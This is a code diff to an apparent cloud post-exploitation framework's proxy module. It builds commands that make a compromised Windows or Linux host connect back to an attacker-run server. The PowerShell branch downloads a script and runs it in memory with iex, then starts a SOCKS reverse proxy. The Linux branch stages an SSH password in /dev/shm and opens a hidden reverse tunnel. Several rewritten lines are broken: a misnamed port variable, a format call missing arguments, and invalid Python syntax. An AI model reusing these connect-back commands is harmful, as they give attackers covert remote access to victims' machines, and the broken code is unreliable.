@@ -742,17 +742,41 @@ class Main:
                             t.start()
                             time.sleep(2)
 
-                            # Start a new thread
-                            # Start an HTTP server on it with the .ps1 file
-                            # Continue to send the connect_back_cmd
-                            # Kill HTTP server
+                            # 1. Start a new thread
+                            # 2. Start an HTTP server on it with the .ps1 file
+                            # 3. Continue to send the connect_back_cmd
+                            # 4. Kill HTTP server
 
-                            # TODO: Separate this string to describe what each step is doing, then build it for the final command
-                            connect_back_cmd = 'iex ((New-Object System.Net.WebClient).DownloadString("http://{}:{}/{}")); Start-SocksProxy -sshhost {} -username {} -password {} -RemotePort 8001 -LocalPort 5050'.format(proxy_ip, proxy_port, secret_string, proxy_ip, proxy_ssh_username, proxy_ssh_password)
+                            # Download the script from the PacuProxy server
+                            downloaded_string = '(New-Object System.Net.WebClient).DownloadString("http://{}:{}/{}")'.format(proxy_ip, pproxy_port, secret_string)
+                            
+                            # Run Invoke-Expression on the downloaded script to import it to memory
+                            invoke_expression = 'iex({})'.format(downloaded_string)
+                            
+                            # Execute the newly imported script to start the reverse proxy
+                            start_proxy_cmd = 'Start-SocksProxy -sshhost {} -username {} -password {} -RemotePort 8001 -LocalPort 5050'.format(proxy_ip, proxy_ssh_username, proxy_ssh_password)
+
+                            # Combine the commands into a one-liner
+                            connect_back_cmd = '{}; {}'.format(invoke_expression, start_proxy_cmd)
                         else:
                             shm_name = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=5))
-                            # TODO: Separate this string to describe what each step is doing, then build it for the final command
-                            connect_back_cmd = 'echo "echo {}" > /dev/shm/{} && chmod 777 /dev/shm/{} && DISPLAY=dummy SSH_ASKPASS=/dev/shm/{} setsid ssh -o UserKnownHostsFile=/dev/null -f -N -R 8001 -oStrictHostKeyChecking=no {}@{} >/dev/null 2>&1 &'.format(proxy_ssh_password, shm_name, shm_name, shm_name, proxy_ssh_username, proxy_ip)
+                            
+                            # Create an in-memory file in /dev/shm that contains the password
+                            create_shm = 'echo "echo {}" > /dev/shm/{}'.format(shm_name)
+                            
+                            # Give the file 777 permissions
+                            add_permissions = 'chmod 777 /dev/shm/{}'.format(shm_name)
+                            
+                            # DISPLAY=dummy to emulate a display
+                            # SSH_ASKPASS=/dev/shm/{} to tell SSH that the file will echo it a password
+                            # setsid to avoid any prompts
+                            # Runs ssh to connect to the PacuProxy server over SSH while forwarding a port,
+                            # without trying to open a shell, but keeping a persistent connection, and
+                            # redirecting stderr to stdout (which then comes back to PacuProxy)
+                            connect = 'DISPLAY=dummy SSH_ASKPASS=/dev/shm/{} setsid ssh -o UserKnownHostsFile=/dev/null -f -N -R 8001 -o StrictHostKeyChecking=no {}@{} >/dev/null 2>&1 &'.format(shm_name, proxy_ssh_username@proxy_ip)
+
+                            # Combine the commands into a one-liner
+                            connect_back_cmd = '{} && {} && {}'.format(create_shm, add_permissions, connect)
                         self.server.run_cmd(proxy_target_agent[0], self.server.all_connections[int(command[2])], connect_back_cmd)
                         self.print('Remote agent instructed to connect!')
                 except Exception as error:
